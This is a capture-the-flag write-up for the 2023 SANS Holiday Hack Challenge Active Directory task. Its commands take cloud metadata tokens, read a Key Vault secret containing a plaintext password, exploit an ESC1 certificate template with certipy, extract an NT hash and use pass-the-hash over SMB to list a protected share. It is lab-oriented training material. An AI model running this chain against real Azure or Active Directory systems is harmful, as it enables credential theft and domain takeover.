# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## 	Active Directory
Difficulty: :christmas_tree::christmas_tree::christmas_tree::christmas_tree:  
Go to Steampunk Island and help Ribb Bonbowford audit the Azure AD environment. What's the name of the secret file in the inaccessible folder on the FileShare?

### Hints
#### Useful Tools
*From: Ribb Bonbowford*
It looks like Alabaster's SSH account has a couple of tools installed which might prove useful.
#### Misconfiguration ADventures
*From: Alabaster Snowball*
Certificates are everywhere. Did you know Active Directory (AD) uses certificates as well? Apparently the service used to manage them can have misconfigurations too.

### Solution
I went back as `alabaster` on the `ssh-server-vm` from [Certificate SSHenanigans]() and realized the reason for the `impacket` folder. I started poking around with Azure APIs a little more, discovering an Azure Key Vault resource:
```bash
alabaster@ssh-server-vm:~$ token=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq .access_token | tr -d '"') && curl -H "Authorization: Bearer $token" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resources?api-version=2021-04-01
{"value":[{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv","name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}},{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv","name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{}}]}
```
```bash
alabaster@ssh-server-vm:~$ token=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s | jq .access_token | tr -d '"') && curl -H "Authorization: Bearer $token" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01
{"value":[{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-it-kv","name":"northpole-it-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{},"systemData":{"createdBy":"thomas@sanshhc.onmicrosoft.com","createdByType":"User","createdAt":"2023-10-30T13:17:02.532Z","lastModifiedBy":"thomas@sanshhc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2023-10-30T13:17:02.532Z"},"properties":{"sku":{"family":"A","name":"Standard"},"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","accessPolicies":[],"enabledForDeployment":false,"enabledForDiskEncryption":false,"enabledForTemplateDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"enableRbacAuthorization":true,"vaultUri":"https://northpole-it-kv.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}},{"id":"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourceGroups/northpole-rg1/providers/Microsoft.KeyVault/vaults/northpole-ssh-certs-kv","name":"northpole-ssh-certs-kv","type":"Microsoft.KeyVault/vaults","location":"eastus","tags":{},"systemData":{"createdBy":"thomas@sanshhc.onmicrosoft.com","createdByType":"User","createdAt":"2023-11-12T01:47:13.059Z","lastModifiedBy":"thomas@sanshhc.onmicrosoft.com","lastModifiedByType":"User","lastModifiedAt":"2023-11-12T01:50:52.742Z"},"properties":{"sku":{"family":"A","name":"standard"},"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","accessPolicies":[{"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","objectId":"0bc7ae9d-292d-4742-8830-68d12469d759","permissions":{"keys":["all"],"secrets":["all"],"certificates":["all"],"storage":["all"]}},{"tenantId":"90a38eda-4006-4dd5-924c-6ca55cacc14d","objectId":"1b202351-8c85-46f1-81f8-5528e92eb7ce","permissions":{"secrets":["get"]}}],"enabledForDeployment":false,"enableSoftDelete":true,"softDeleteRetentionInDays":90,"vaultUri":"https://northpole-ssh-certs-kv.vault.azure.net/","provisioningState":"Succeeded","publicNetworkAccess":"Enabled"}}],"nextLink":"https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/providers/Microsoft.KeyVault/vaults?api-version=2022-07-01&$skiptoken=bm9ydGhwb2xlLXJnMXxub3J0aHBvbGUtc3NoLWNlcnRzLWt2"}
```

Switching token for the resource https://vault.azure.net, I was able to get the content of the Vault:
```bash
alabaster@ssh-server-vm:~$ token=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s | jq .access_token | tr -d '"') && curl -H "Authorization: Bearer $token" https://northpole-it-kv.vault.azure.net/secrets?api-version=7.4
{"value":[{"id":"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript","attributes":{"enabled":true,"created":1699564823,"updated":1699564823,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90},"tags":{}}],"nextLink":null}
alabaster@ssh-server-vm:~$ token=$(curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fvault.azure.net' -H Metadata:true -s | jq .access_token | tr -d '"') && curl -H "Authorization: Bearer $token" https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript?api-version=7.4
{"value":"Import-Module ActiveDirectory; $UserName = \"elfy\"; $UserDomain = \"northpole.local\"; $UserUPN = \"$UserName@$UserDomain\"; $Password = ConvertTo-SecureString \"J4`ufC49/J4766\" -AsPlainText -Force; $DCIP = \"10.0.0.53\"; New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname \"\" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru","id":"https://northpole-it-kv.vault.azure.net/secrets/tmpAddUserScript/ec4db66008024699b19df44f5272248d","attributes":{"enabled":true,"created":1699564823,"updated":1699564823,"recoveryLevel":"Recoverable+Purgeable","recoverableDays":90},"tags":{}}
```

The secret contains the following Powershell script with hardcoded credentials in clear text:
```cmd
Import-Module ActiveDirectory;
$UserName = "elfy";
$UserDomain = "northpole.local";
$UserUPN = "$UserName@$UserDomain";
$Password = ConvertTo-SecureString "J4`ufC49/J4766" -AsPlainText -Force;
$DCIP = "10.0.0.53";
New-ADUser -UserPrincipalName $UserUPN -Name $UserName -GivenName $UserName -Surname "" -Enabled $true -AccountPassword $Password -Server $DCIP -PassThru
```

I then ran certipy to obtain vulnerable certificate configurations from AD:
```bash
alabaster@ssh-server-vm:~/impacket$ certipy find -u elfy@northpole.local -p 'J4`ufC49/J4766' -dc-ip 10.0.0.53 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'northpole-npdc01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'northpole-npdc01-CA' via RRP
[*] Got CA configuration for 'northpole-npdc01-CA'
[*] Saved BloodHound data to '20231217214704_Certipy.zip'. Drag and drop the file into the BloodHound GUI from @ly4k
[*] Saved text output to '20231217214704_Certipy.txt'
[*] Saved JSON output to '20231217214704_Certipy.json'
```

Looking at the output from `certipy`, I observed that the `NorthPoleUsers` template was vulnerable:
```bash
  # Output removed to shorten report
  "Certificate Templates": {
    "0": {
      "Template Name": "NorthPoleUsers",
      "Display Name": "NorthPoleUsers",
      "Certificate Authorities": ["northpole-npdc01-CA"],
      # Output removed to shorten report
      "[!] Vulnerabilities": {
        "ESC1": "'NORTHPOLE.LOCAL\\\\Domain Users' can enroll, enrollee supplies subject, and template allows client authentication"
      }
    }
  },
```

Based on that, I started the exploitation:
```bash
alabaster@ssh-server-vm:~/impacket$ lookupsid.py 'northpole.local/elfy:J4`ufC49/J4766@10.0.0.53'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Brute forcing SIDs at 10.0.0.53
[*] StringBinding ncacn_np:10.0.0.53[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1338289034-4095587347-713453443
# Output removed to shorten report
1103: NORTHPOLE\researchers (SidTypeGroup)
1104: NORTHPOLE\elfy (SidTypeUser)
1105: NORTHPOLE\wombleycube (SidTypeUser)
# Output removed to shorten report
```
```bash
alabaster@ssh-server-vm:~/impacket$ certipy auth -pfx 'wombleycube.pfx' -username 'wombleycube' -domain 'northpole.local' -dc-ip 10.0.0.53 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: wombleycube@northpole.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'wombleycube.ccache'
[*] Trying to retrieve NT hash for 'wombleycube'
[*] Got hash for 'wombleycube@northpole.local': aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23
```
```bash
alabaster@ssh-server-vm:~/impacket$ smbclient.py -dc-ip 10.0.0.53 -hashes aad3b435b51404eeaad3b435b51404ee:5740373231597863662f6d50484d3e23 -target-ip 10.0.0.53 northpole.local/wombleycube@npdc01.northpole.local
Impacket v0.11.0 - Copyright 2023 Fortra

Type help for list of commands
# shares
# use FileShare
# cd super_secret_research
# ls
drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 .
drw-rw-rw-          0  Sun Dec 17 01:15:12 2023 ..
-rw-rw-rw-        231  Sun Dec 17 01:15:12 2023 InstructionsForEnteringSatelliteGroundStation.txt
```

The filename `InstructionsForEnteringSatelliteGroundStation.txt` is the flag and once downloaded I could get the content which will be useful for the Speaker Access:
```
Note to self:

To enter the Satellite Ground Station (SGS), say the following into the speaker:

And he whispered, 'Now I shall be out of sight;
So through the valley and over the height.'
And he'll silently take his way.
```